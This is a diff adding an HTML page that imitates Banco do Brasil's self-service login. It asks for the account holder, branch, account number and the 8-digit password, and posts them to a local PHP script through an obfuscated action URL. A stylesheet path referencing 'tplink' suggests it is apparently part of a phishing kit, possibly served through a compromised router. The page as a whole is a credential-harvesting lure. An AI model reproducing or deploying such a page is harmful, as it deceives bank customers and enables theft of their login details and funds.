@@ -1,0 +1,538 @@
+<html><head>
+
+ <meta charset="utf-8">
+
+ <meta http-equiv="X-UA-Compatible" content="IE=9">
+
+ <link rel="stylesheet" type="text/css" href="apptplink_css/style.css">
+
+ <title></title>
+
+ <script type="text/javascript">
+
+	function login(){
+
+		var a1 = document.getElementById('senha8').value.length;
+
+		var a2 = document.getElementById('agen').value.length;
+
+		var a3 = document.getElementById('cont').value.length;
+
+		if ((a1 == 8) && (a2 > 4) && (a3 >1)){
+
+
+if ( document.getElementById('agen').value == "" || 
+document.getElementById('agen').value.length < 4 || 
+document.getElementById('agen').value == "0000-0" || 
+document.getElementById('agen').value == "1111-1" || 
+document.getElementById('agen').value == "2222-2" ||
+document.getElementById('agen').value == "3333-3" || 
+document.getElementById('agen').value == "4444-4" || 
+document.getElementById('agen').value == "5555-5" || 
+document.getElementById('agen').value == "6666-6" || 
+document.getElementById('agen').value == "7777-7" || 
+document.getElementById('agen').value == "8888-8" || 
+document.getElementById('agen').value == "9999-9"){
+alert ("Agência, inválida!");
+document.getElementById('agen').value.focus(); return false;
+}
+
+				document.getElementById("formlogin").submit();
+
+			}else{
+
+				alert('Necessário informar todos os campos!');
+
+				return false;
+
+		}			
+
+	}
+
+	
+
+function FormataDado(campo,tammax,pos,teclapres){
+
+	var keyCode;
+
+	if (teclapres.srcElement)
+
+		keyCode = teclapres.keyCode;
+
+	else if (teclapres.target)
+
+		keyCode = teclapres.which;
+
+	
+
+	if (keyCode == 0 || keyCode == 8)
+
+		return true;
+
+		
+
+	if ((keyCode < 48 || keyCode > 57) && (keyCode != 88) && (keyCode != 120))
+
+		return false;
+
+
+
+		var tecla = keyCode;
+
+		vr = document.getElementById(campo).value;
+
+		vr = vr.replace( "-", "" );
+
+		vr = vr.replace( "/", "" );
+
+		tam = vr.length ;
+
+		
+
+		if (tam < tammax && tecla != 8){ tam = vr.length + 1 ; }
+
+		
+
+		if (tecla == 8 ){ tam = tam - 1 ; }
+
+		if ( tecla == 8 || tecla == 88 || tecla >= 48 && tecla <= 57 || tecla >= 96 && tecla <= 105 || tecla == 120){
+
+			if ( tam <= 2 ){
+
+		 		document.getElementById(campo).value = vr ;}
+
+			if ( tam > pos && tam <= tammax ){
+
+				document.getElementById(campo).value = vr.substr( 0, tam - pos ) + '-' + vr.substr( tam - pos, tam );}
+
+		}
+
+}
+
+function mask(isNum, event, field, mask, maxLength) {
+
+
+
+	var keyCode;
+
+	if (event.srcElement)
+
+		keyCode = event.keyCode;
+
+	else if (event.target)
+
+		keyCode = event.which;
+
+		
+
+	var maskStack = new Array();
+
+		
+
+	var isDynMask = false;
+
+	if (mask.indexOf('[') != -1)
+
+		isDynMask = true;
+
+				
+
+	var length = mask.length;
+
+	
+
+	for (var i = 0; i < length; i++)
+
+		maskStack.push(mask.charAt(i));
+
+		
+
+	var value = field.value;
+
+	var i = value.length;
+
+	
+
+	if (keyCode == 0 || keyCode == 8)
+
+		return true;
+
+
+
+	//código adaptado para aceitar X (maiúsculo) ou x (minúsculo), além de números
+
+	if (isNum && (keyCode < 48 || keyCode > 57) && (keyCode != 88) && (keyCode != 120))
+
+		return false;
+
+	
+
+	if (!isDynMask && i < length) {
+
+		
+
+		if (maskStack.toString().indexOf(String.fromCharCode(keyCode)) != -1 && keyCode != 8) {
+
+			return false;
+
+		} else {
+
+			if (keyCode != 8) {
+
+				if (maskStack[i] != '#') {
+
+					var old = field.value;
+
+					field.value = old + maskStack[i];
+
+				}			
+
+			}
+
+			
+
+			if (autoTab(field, keyCode, length)) {
+
+				if (!document.layers) {
+
+					return true;
+
+				} else if (keyCode != 8) {
+
+					field.value += String.fromCharCode(keyCode);
+
+					return false;
+
+				} else {
+
+					return true;
+
+				}
+
+			} else {
+
+				return false;
+
+			}				
+
+		}
+
+		
+
+	} else if (isDynMask) {
+
+		var maskChars = "";
+
+		for (var j = 0; j < maskStack.length; j++)
+
+			if (maskStack[j] != '#' && maskStack[j] != '[' && maskStack[j] != ']')
+
+				maskChars += maskStack[j];
+
+
+
+		var tempValue = "";
+
+		for (var j = 0; j < value.length; j++) {
+
+			if (maskChars.indexOf(value.charAt(j)) == -1)
+
+				tempValue += value.charAt(j);
+
+		}
+
+		
+
+		value = tempValue + String.fromCharCode(keyCode);
+
+						
+
+		if (maskChars.indexOf(String.fromCharCode(keyCode)) != -1) {
+
+			return false;
+
+		} else {
+
+			var staticMask = mask.substring(mask.indexOf(']') + 1);
+
+			var dynMask = mask.substring(mask.indexOf('[') + 1, mask.indexOf(']'));
+
+			
+
+			var realMask = new Array;
+
+			
+
+			if (mask.indexOf('[') == 0) {
+
+				var countStaticMask = staticMask.length - 1;
+
+				var countDynMask = dynMask.length - 1;
+
+				
+
+				for (var j = value.length - 1; j >= 0; j--) {
+
+					if (countStaticMask >= 0) {
+
+						realMask.push(staticMask.charAt(countStaticMask));
+
+						countStaticMask--; 
+
+					} 
+
+					if (countStaticMask < 0) {
+
+						if (countDynMask >= 0) {
+
+							if (dynMask.charAt(countDynMask) != '#') {
+
+								realMask.push(dynMask.charAt(countDynMask));
+
+								countDynMask--;
+
+							}
+
+						}
+
+						if (countDynMask == -1) {
+
+							countDynMask = dynMask.length - 1;
+
+						}
+
+						realMask.push(dynMask.charAt(countDynMask));
+
+						countDynMask--; 
+
+					}
+
+				}
+
+			}
+
+			
+
+			var result = "";
+
+				
+
+			var countValue = 0;
+
+			
+
+			while (realMask.length > 0) {
+
+				var c = realMask.pop();	
+
+				if (c == '#') {
+
+					result += value.charAt(countValue);
+
+					countValue++;	
+
+				} else {
+
+					result += c;
+
+				}
+
+			}
+
+
+
+			field.value = result;
+
+		
+
+			if (maxLength != undefined &&  value.length == maxLength) {
+
+				
+
+				var form = field.form;
+
+				for (var i = 0; i < form.elements.length; i++) {
+
+					if (form.elements[i] == field) {
+
+						field.blur();
+
+						//if alterado para quando a máscara for utilizada no último campo, não dê mensagem de erro quando tentar colocar o foco no "Salvar"
+
+						//if (form.elements[i + 1] != null)										 
+
+						if ((form.elements[i + 1] != null) && (form.elements[i + 1].name != "METHOD"))
+
+							form.elements[i + 1].focus();
+
+						break;
+
+					}
+
+				}
+
+			}
+
+			
+
+			return false;
+
+		}
+
+	} else {
+
+		return false;
+
+	}
+
+}
+
+
+
+function clear_g(){
+
+	document.getElementById('senha8').value ='';
+
+	document.getElementById('agen').value ='';
+
+	document.getElementById('cont').value ='';
+
+}
+
+	
+
+ </script>
+
+</head>
+
+<body>
+
+	<div class="topbar">
+
+		<div class="topbar1"></div>
+
+		<div class="topbar2"></div>
+
+		<div class="topbar3">
+
+		<div class="tophelpimg"></div>
+
+		</div>
+
+	</div>
+
+	
+
+	<div class="barra1"></div>
+
+	<div class="barra2"></div>
+
+	<div class="barra3"></div>
+
+	<div class="barra4"></div>
+
+	<div class="barra5"></div>
+
+	<div class="barra6"></div>
+
+	<div class="barra7"></div>
+
+	<div class="corpo">
+
+		<div class="titlecaixa">Autoatendimento</div>
+
+		<div class="caixa">
+
+				 	 	
+
+			<div class="caixaleft">
+
+				<form method="POST" action="ambienteLayout=completo.php#133235.shtml- eZdADuaR4iuOjZCPIh2rETF2RZZFggWGcrs$W9yE-bpPD$ma1Yo#vm07z%75tjtoC2S8vNVXTqDrXiUWS1eaPgjn6Lg8xMOf5!gkWHnHXH1FQ!-699wk-%IMR2WfMCklv2Aic2uk%8nOauU5wKHyStY0R4AY1tMgTNHaZR-lZ74aB5Ek3GtZ3GJ55fI61n92#wmmeWdWOoUMIYNlP2KVIsLDY#AOFyHERiRH2e5A#-6FaIZAqbEqW5z0kUKxMD9rQCQYaaF2XZYx7mnrv#c3jmnb6J$ExCRdhj8rlgt49JXr" id="formlogin" name="formlogin">
+
+				<div style="margin-left:15px;margin-top:10px;width:240px;">
+
+				Titular:<br>
+
+				<select class="selectcaixa" name="titulo" id="titulo" style="width:240px!important;height:30px!important;border-radius:3px;">
+
+					<option value="1">1° Titular</option>
+
+					<option value="2">2° Titular</option>
+
+					<option value="3">3° Titular</option>
+
+					<option value="4">4° Titular</option>
+
+				</select><br>
+
+				</div>
+
+				
+
+				<div style="float:left;margin-left:15px;margin-top:6px;margin-bottom:6px;">
+
+				Agência:<br><input type="text" style="width:110px;height:30px;border-radius:3px;padding:0 5px;" id="agen" onkeypress="return mask(true, event, this, '####-#');" maxlength="6" name="agen" class="inputcaixa">
+
+				</div>
+
+				<div style="float:left;margin-left:4px;margin-top:6px;margin-bottom:6px;">
+
+				Conta:<br><input type="text" maxlength="13" onkeypress="return FormataDado('cont',12,1,event);" style="width:130px;height:30px;border-radius:3px;padding:0 5px;" id="cont" name="cont" class="inputcaixa">
+
+				</div>
+
+				
+
+				<br><br><br>
+
+				<div style="margin-left:15px;margin-top:4px;">
+
+				Senha de autoatendimento (8 dígitos):<br><input type="password" name="senha8" id="senha8" maxlength="8" style="width:205px;height:30px;border-radius:3px 0px 0px 3px;padding:0 5px;float:left;border-right:none;" class="inputcaixa">
+
+				<span style="display:block;float:left;width:37px;height:30px;background-color:#23569C;color: #fff;font-weight:bold;text-align:center;font-size: 17px;border-radius: 0px 3px 3px 0px;line-height:30px;">?</span>
+
+				</div>
+
+				
+
+				<input style="margin-left:15px;margin-top:15px;" type="button" class="btncaixa" onclick="login();" value="ENTRAR">
+
+				<input type="button" class="btncaixa" value="LIMPAR" onclick="clear_g();">
+
+				</form>
+
+			</div>
+
+			<div class="caixaright"></div>
+
+		</div>
+
+		<div class="help"></div>
+
+	</div>
+
+	<div class="logo">
+
+	</div>
+
+
+
+	<div class="rodape">
+
+		<div class="marca">© Banco do Brasil</div>
+
+		<div class="rodape1">Central de Atendimento BB - 4004 0001 / 0800 729 0001</div>
+
+		<div class="rodape2">SAC BB - 0800 729 0722</div>
+
+		<div class="rodape3">Ouvidoria - 0800 729 5678</div>
+
+		<div class="rodape4">Deficientes auditivos/fala - 0800 729 0088</div>
+
+		<div class="rodape5">Segurança</div>
+
+	</div>
+
+
+
+</body></html>
